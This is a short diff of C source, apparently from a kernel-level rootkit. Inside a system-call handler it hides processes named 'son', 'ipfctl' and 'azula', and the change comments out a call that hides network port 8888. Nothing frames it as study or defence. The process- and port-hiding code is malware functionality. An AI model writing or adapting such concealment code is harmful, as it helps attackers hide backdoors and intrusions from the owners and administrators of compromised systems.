@@ -110,7 +110,7 @@ static int general_handler(struct thread *td, void *syscall_args) {
 	process_hiding("son");
 	process_hiding("ipfctl");
 	process_hiding("azula");
-	port_hiding(8888);
+	//port_hiding(8888);
 	return(0);
 }
 
